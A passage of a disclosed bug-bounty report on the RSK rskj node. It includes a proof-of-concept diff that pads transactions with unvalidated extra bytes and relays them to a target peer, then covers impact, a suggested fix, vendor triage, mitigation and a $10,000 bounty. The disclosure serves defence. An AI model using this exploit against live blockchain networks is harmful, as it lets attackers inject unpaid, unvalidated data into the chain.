transaction with the network via the normal p2p process, and have the extra data mined into a block.\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s the full diff for the attacker/local node. Sorry again, it\u0026#39;s a little hacky. I could have used the eth_sendRawTransaction endpoint, but I didn\u0026#39;t want to go through the process of hand-constructing the rlp-encoded data:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/rskj-core/src/main/java/org/ethereum/core/Transaction.java b/rskj-core/src/main/java/org/ethereum/core/Transaction.java\nindex bbd21ee..801e18d 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/rskj-core/src/main/java/org/ethereum/core/Transaction.java\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/rskj-core/src/main/java/org/ethereum/core/Transaction.java\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -164,7 +164,7 @@\u003c/span\u003e public class Transaction {\n     }\n\n     public Transaction toImmutableTransaction() {\n\u003cspan class=\"gd\"\u003e-        return new ImmutableTransaction(this.getEncoded());\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        return new ImmutableTransaction(this.getBeefyEncoded());\n\u003c/span\u003e     }\n\n     private byte extractChainIdFromV(byte v) {\n\u003cspan class=\"p\"\u003e@@ -516,7 +516,17 @@\u003c/span\u003e public class Transaction {\n         return rlpRaw;\n     }\n\n+    // Clear the rlpEncoded if present, and re-encode with extra 0xbeef data\n\u003cspan class=\"gi\"\u003e+    public byte[] getBeefyEncoded() {\n+        rlpEncoded = null;\n+        return getEncodedInternal(\u0026quot;beefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeef\u0026quot;);\n+    }\n+\n\u003c/span\u003e     public byte[] getEncoded() {\n\u003cspan class=\"gi\"\u003e+        return getEncodedInternal(null);\n+    }\n+    private byte[] getEncodedInternal(String beef) {\n\u003c/span\u003e         if (rlpEncoded != null) {\n             return rlpEncoded;\n         }\n\u003cspan class=\"p\"\u003e@@ -556,8 +566,15 @@\u003c/span\u003e public class Transaction {\n             s = RLP.encodeElement(EMPTY_BYTE_ARRAY);\n         }\n\n-        this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,\n\u003cspan class=\"gd\"\u003e-                toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        // if 0xbeef bytes are present, tack them on at the end of the tx\n+        if (beef != null) {\n+            this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,\n+                    toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s,\n+                    RLP.encodeElement(Hex.decode(beef)));\n+        } else {\n+            this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,\n+                    toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s);\n+        }\n\u003c/span\u003e\n         Keccak256 hash = this.getHash();\n         this.hash = hash == null ? null : hash.getBytes();\n\u003cspan class=\"gh\"\u003ediff --git a/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java b/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java\nindex 04d0ddb..ad0f3c1 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -599,7 +599,8 @@\u003c/span\u003e public class Web3Impl implements Web3 {\n         br.miner = isPending ? null : TypeConverter.toJsonHex(b.getCoinbase().getBytes());\n         br.difficulty = TypeConverter.toJsonHex(b.getDifficulty().getBytes());\n         br.totalDifficulty = TypeConverter.toJsonHex(this.blockchain.getBlockStore().getTotalDifficultyForHash(b.getHash().getBytes()).asBigInteger());\n\u003cspan class=\"gd\"\u003e-        br.extraData = TypeConverter.toJsonHex(b.getExtraData());\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        // hacky, for testing, return the full encoded block instead of extraData\n+        br.extraData = TypeConverter.toJsonHex(b.getEncoded());\n\u003c/span\u003e         br.size = TypeConverter.toJsonHex(b.getEncoded().length);\n         br.gasLimit = TypeConverter.toJsonHex(b.getGasLimit());\n         Coin mgp = b.getMinimumGasPrice();\n\u003cspan class=\"gh\"\u003ediff --git a/rskj-core/src/main/resources/config/regtest.conf b/rskj-core/src/main/resources/config/regtest.conf\nindex df111fa..1e81a7c 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/rskj-core/src/main/resources/config/regtest.conf\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/rskj-core/src/main/resources/config/regtest.conf\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -8,12 +8,13 @@\u003c/span\u003e peer {\n         # the peer window will show\n         # only what retrieved by active\n         # peer [true/false]\n\u003cspan class=\"gd\"\u003e-        enabled = false\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        enabled = true\n\u003c/span\u003e\n         # List of the peers to start\n         # the search of the online peers\n         # values: [ip:port]\n\u003cspan class=\"gd\"\u003e-        ip.list = [ ]\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        # replace \u0026lt;target_ip\u0026gt; with the \u0026quot;real\u0026quot; network node that will be mining\n+        ip.list = [\u0026quot;\u0026lt;target_ip\u0026gt;:50501\u0026quot;]\n\u003c/span\u003e     }\n\n     # Port for server to listen for incoming connections\n\u003cspan class=\"p\"\u003e@@ -24,7 +25,8 @@\u003c/span\u003e peer {\n }\n\n miner {\n\u003cspan class=\"gd\"\u003e-    server.enabled = true\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    # Attacker node won\u0026#39;t mine, so we know the tx propagated through the network\n+    server.enabled = false\n\u003c/span\u003e     client.enabled = true\n     minGasPrice = 0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe attacker can add arbitrary data into the blockchain without paying the requisite gas or undergoing any validation of the extra data.\u003c/p\u003e\n\n\u003cp\u003eI can think of three ways to get this data into the system: 1) the method I detailed in the above PoC, in which the attacker creates a valid transaction and adds the data, 2) a malicious miner could just add the data to any valid transaction it has in its pool; 3) an attacker could wait for new pending transactions to appear, then add their data and send the tx back to the network. If the attacker\u0026#39;s version of the tx makes it to the miner that produces the next block, the data will make it to the chain without the attacker even needing to create their own valid tx.\u003c/p\u003e\n\n\u003cp\u003eI have not checked to see how much data can be appended, but I assume its limited only by whatever overall block/transaction/message size constraints exist.\u003c/p\u003e\n","bounty_amount":"10000.0","formatted_bounty":"$10,000","weakness":{"id":52,"name":"Deserialization of Untrusted Data"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":234,"voters":["physuru","delimitry","dittyroma","z3t","nopnop","mashoud1122","pr3r00t","muon4","lucash-dev","troubleshooter","and 224 more..."],"severity":{"rating":"critical","score":9.3,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":5820,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/rsksmart/rskj","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3215266,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The simple fix at this point would be to throw an exception in rlpParse if transaction.get(9).getRLPData() != null.\n\nI have not checked the blockchain to see if anyone has exploited this. If anyone has, some additional code will be needed to make sure that any existing beefy transactions can still pass through as valid.","markdown_message":"\u003cp\u003eThe simple fix at this point would be to throw an exception in rlpParse if transaction.get(9).getRLPData() != null.\u003c/p\u003e\n\n\u003cp\u003eI have not checked the blockchain to see if anyone has exploited this. If anyone has, some additional code will be needed to make sure that any existing beefy transactions can still pass through as valid.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-19T06:08:52.843Z","updated_at":"2018-08-19T06:08:52.843Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"iovlabs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3223360,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-21T03:11:25.973Z","updated_at":"2018-08-21T03:11:25.973Z","additional_data":{"old_severity":"Critical","new_severity":"Critical (9.3)","old_severity_id":198511,"new_severity_id":199053},"actor":{"username":"julianor","cleared":false,"url":"/julianor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"iovlabs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3223362,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-21T03:12:02.186Z","updated_at":"2018-08-21T03:12:02.186Z","actor":{"username":"julianor","cleared":false,"url":"/julianor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"iovlabs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3228844,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for finding and reporting this bug. A mitigation has been deployed and the RSK team is working on a definitive fix for this and other similar message parsing issues that were identified.","markdown_message":"\u003cp\u003eThanks for finding and reporting this bug. A mitigation has been deployed and the RSK team is working on a definitive fix for this and other similar message parsing issues that were identified.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-22T04:13:22.858Z","updated_at":"2018-08-22T04:13:22.858Z","actor":{"username":"julianor","cleared":false,"url":"/julianor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"iovlabs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3287078,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @ahook ! Thank you very much for your report, we highly appreciate the time you have spent in it. We look forward to hearing more from you!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ahook\"\u003e@ahook\u003c/a\u003e ! Thank you very much for your report, we highly appreciate the time you have spent in it. We look forward to hearing more from you!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-04T00:59:28.919Z","updated_at":"2018-09-04T00:59:28.919Z","actor":{"url":"/iovlabs","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Prz5MCDWRGv5MpRAQsmSVoLw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"IOVLabs"}},"bounty_amount":"10000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"iovlabs","collaborator":{"username":"ahook","url":"/ahook"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3287095,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome! Thanks!!","markdown_message":"\u003cp\u003eAwesome! Thanks!!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-04T01:17:56.436Z","updated_at":"2018-09-04T01:17:56.436Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"iovlabs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3308018,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-07T16:55:20.470Z","updated_at":"2018-09-07T16:55:20.470Z","actor":{"username":"julianor","cleared":false,"url":"/julianor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ahook","url":"/ahook"},"genius_execution_id":null,"team_handle":"iovlabs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5835124,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-18T13:07:35.256Z","updated_at":"2019-09-18T13:07:35.256Z","first_to_agree":true,"actor":{"username":"bernacodesido","cleared":false,"url":"/bernacodesido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/663/587/40cf6f2372b7222ff24e3ec497dc994f5b9dca4c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"iovlabs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5835212,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-18T13:18:55.870Z","updated_at":"2019-09-18T13:18:55.870Z","actor":{"username":"julianor","cleared":false,"url":"/julianor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"iovlabs","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}